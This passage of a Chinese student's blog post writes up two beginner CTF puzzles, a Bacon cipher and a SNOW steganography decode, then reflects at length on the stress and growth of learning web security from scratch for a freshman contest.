+<img src="/2025/10/28/WHUCTF%E6%96%B0%E7%94%9F%E8%B5%9BWP%EF%BC%8C%E6%80%BB%E7%BB%93%E4%B8%8E%E5%BA%9F%E8%AF%9D/QQ20251027-100956.png" srcset="/img/loading.gif" lazyload class="">
+
+<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="0-Div3-猫咪日记01"><a href="#0-Div3-猫咪日记01" class="headerlink" title="[0-Div3]猫咪日记01"></a>[0-Div3]猫咪日记01</h3><p>B1ank啥也不知道哦但是随波逐流一把梭（）</p>
+<h3 id="0-Div3-梅林午餐肉"><a href="#0-Div3-梅林午餐肉" class="headerlink" title="[0-Div3]梅林午餐肉"></a>[0-Div3]梅林午餐肉</h3><p>题目提示为：<br>【雪不雪花任君选择can crash bacon 不要再玩你那个雪了flag全小写，加上花括号，单词之间用下划线拼接如果玩雪的话密钥为snow】</p>
+<p>（忘记截图了…）<br>猜测为培根密码和snow隐写，也可以不用snow</p>
+<p>下载完查看文件发现</p>
+<img src="/2025/10/28/WHUCTF%E6%96%B0%E7%94%9F%E8%B5%9BWP%EF%BC%8C%E6%80%BB%E7%BB%93%E4%B8%8E%E5%BA%9F%E8%AF%9D/QQ20251024-134305.png" srcset="/img/loading.gif" lazyload class="">
+<p>这里把c换成A依旧是随波逐流一把梭，单词之间加上下划线就行。</p>
+<p>如果好奇snow的话可以</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">snow.exe -C -p meat.txt<br></code></pre></td></tr></table></figure>
+
+<p>（这里meat.txt使用实际路径地址）<br>解密完是C&#x3D;A所以可以不玩雪。</p>
+<h2 id="最后想说一些话"><a href="#最后想说一些话" class="headerlink" title="最后想说一些话"></a>最后想说一些话</h2><p>总算忙完了，复现成功，wp也写完了，程序设计改完了，sqlmap也调好了。就很想写点什么纪念一下。</p>
+<p>其实感觉还挺迷幻的，因为9.4号才拿到电脑，然后九月上旬开始零基础打ctf，打web的时间可能也就一个多月吧，能打到这个地步我确实是没想到的，差一题就ak了。比赛打完了以后就被邀请加入乐队了，真的挺迷幻的，虽然学长们都在夸我，但总是不踏实。因为我跟队里其他人的差距还是有点多的，也在想如果别的选手跟我一样死轴web会不会比我做的更好。但是，可能就是在那个点进web的瞬间，在好玩与打不出的爱恨交织下倔强下去，不会就打到会，于是就这样一直打下来了。</p>
+<img src="/2025/10/28/WHUCTF%E6%96%B0%E7%94%9F%E8%B5%9BWP%EF%BC%8C%E6%80%BB%E7%BB%93%E4%B8%8E%E5%BA%9F%E8%AF%9D/QQ20251027-225714.png" srcset="/img/loading.gif" lazyload class="">
+
+<p>很累，特别累。</p>
+<p>什么都不会，从零开始摸索，没看过csdn也没看过github，看文档能看半天。工具一点点下，一点点调，超级社恐和内耗，问学长的时候感觉自己啥也不会，就特别清晰地知道自己的能力不足，压力很大。想起来我两个星期前发post包还能发错，然后php水平烂的不行，前端三件套也只知道个大概，java更是一点没学。</p>
+<p>忐忑，不安，整个人在秋季逐渐寒冷的空气里蒸发掉水分，变成搁浅在岸边不知所措的鱼。</p>
+<p>就这样就开始打新生赛了。</p>
+<p>纯坐牢，压力很大，夹在ct两位大佬之间，周围吸引了一堆学长，压力更爆了，简直无法思考，捋不清一条完整的逻辑链。其实没人的时候我反而更冷静，唉。div2一个题能坐三四个小时，apache踩坑闭环坐了六个小时，java现学先卖打了三个小时，zako生死时速甚至最后半小时bp不行开始下yakit，卡在最后一分半交了flag。</p>
+<p>一直开玩笑自嘲说边哭边打边打边哭，有的时候是真的很想哭的，但最终还是笑一笑打下来了。</p>
+<p>现在想一想新生赛确实还有很多要优化的地方，很多逻辑上再冷静一点捋一捋会更快，能优化出时间去打unser，但是最终——最终还是止步于此了。</p>
+<p>好像也没什么别的说的了，只好接着push自己接着打接着学了，校赛再战。</p>
+<p>校赛再战。</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/CTF-WP/" class="print-no-link">#CTF WP</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>WHUCTF新生赛WP，总结与废话</div>
+      <div>http://example.com/2025/10/28/WHUCTF新生赛WP，总结与废话/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Blank</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年10月28日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener">Hexo</a>  |  <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener">Fluid</a> |  欢迎交流学习 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
